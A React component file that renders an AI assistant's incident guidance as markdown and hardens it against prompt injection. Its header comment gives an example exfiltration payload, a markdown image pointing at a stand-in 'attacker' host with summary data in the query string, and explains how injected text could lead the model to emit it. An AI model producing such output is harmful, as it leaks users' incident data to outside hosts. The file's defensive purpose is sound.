import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

/**
 * Renders assistant guidance as markdown.
 *
 * The system prompt asks the model for `## Section headers`, numbered lists and
 * bold emphasis, and nothing rendered any of it -- users saw the literal
 * characters `## Immediate Legal Requirements` in a product whose whole value
 * is a scannable, prioritised action list. (design 1c, "nothing here is raw ##")
 *
 * Component overrides rather than a prose plugin, so the type scale is the
 * design's own: serif for section headings, DM Sans 15/1.65 for body.
 *
 * **This renders model output, and model output is downstream of two untrusted
 * inputs**: the administrator's incident text and the policy documents an
 * uploader supplies. So it is a prompt-injection sink. `img` and `a` are
 * constrained accordingly:
 *
 * - `img` is not rendered at all. A remote image is a GET the browser makes
 *   with no interaction, so `![](https://attacker/?d=<summary>)` in model
 *   output exfiltrates whatever the model was persuaded to put in the query
 *   string -- and because guidance is persisted, it re-fires for every later
 *   viewer of the incident. Guidance has no legitimate need for images; the
 *   alt text is shown instead so nothing is silently dropped.
 * - `a` is restricted to http(s) and relative targets, and carries
 *   `rel="noopener noreferrer nofollow"`. A `javascript:` href would be script
 *   execution on this origin; `noreferrer` keeps the incident URL out of the
 *   Referer sent to whatever a link points at.
 */

/**
 * Allow only targets that cannot execute and cannot be a credential-bearing
 * scheme. Anything else renders as plain text.
 */
function safeHref(href: string | undefined): string | undefined {
  if (!href) return undefined;
  const value = href.trim();
  if (value.startsWith('/') || value.startsWith('#')) return value;
  try {
    const url = new URL(value);
    return url.protocol === 'http:' || url.protocol === 'https:' ? value : undefined;
  } catch {
    return undefined;
  }
}
export function GuidanceBlock({ children }: { children: string }) {
  return (
    <div className="flex flex-col gap-3 text-[15px] leading-[1.65] text-text-secondary">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          h1: ({ children }) => (
            <h3 className="font-display text-[26px] leading-[1.2] tracking-[-0.02em] text-text">
              {children}
            </h3>
          ),
          h2: ({ children }) => (
            <h3 className="mt-2 font-display text-[22px] leading-[1.25] tracking-[-0.02em] text-text">
              {children}
            </h3>
          ),
          h3: ({ children }) => (
            <h4 className="mt-2 text-[16px] font-medium leading-[1.4] text-text">{children}</h4>
          ),
          p: ({ children }) => <p className="text-[15px] leading-[1.65]">{children}</p>,
          ul: ({ children }) => (
            <ul className="flex list-disc flex-col gap-1.5 pl-5 marker:text-text-muted">
              {children}
            </ul>
          ),
          ol: ({ children }) => (
            <ol className="flex list-decimal flex-col gap-1.5 pl-5 marker:text-text-muted">
              {children}
            </ol>
          ),
          li: ({ children }) => <li className="text-[15px] leading-[1.6]">{children}</li>,
          strong: ({ children }) => <strong className="font-medium text-text">{children}</strong>,
          em: ({ children }) => <em className="italic">{children}</em>,
          a: ({ href, children }) => {
            const safe = safeHref(href);
            if (!safe) return <span>{children}</span>;
            return (
              <a
                href={safe}
                rel="noopener noreferrer nofollow"
                className="underline underline-offset-2 hover:text-text"
              >
                {children}
              </a>
            );
          },
          // Not rendered: a remote image is an unprompted outbound GET, and
          // this is model output. The alt text is kept so the reader can see
          // that something was there.
          img: ({ alt }) => (
            <span className="text-[13px] text-text-muted">
              {alt ? `[image: ${alt}]` : '[image omitted]'}
            </span>
          ),
          code: ({ children }) => (
            <code className="tabular rounded bg-input px-1.5 py-0.5 text-[13px] text-text">
              {children}
            </code>
          ),
          blockquote: ({ children }) => (
            <blockquote className="border-l-2 border-line pl-4 text-text-tertiary">
              {children}
            </blockquote>
          ),
          hr: () => <hr className="border-line" />,
          table: ({ children }) => (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse text-[14px]">{children}</table>
            </div>
          ),
          th: ({ children }) => (
            <th className="border-b border-line px-3 py-2 text-left font-medium text-text">
              {children}
            </th>
          ),
          td: ({ children }) => <td className="border-b border-line/50 px-3 py-2">{children}</td>,
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
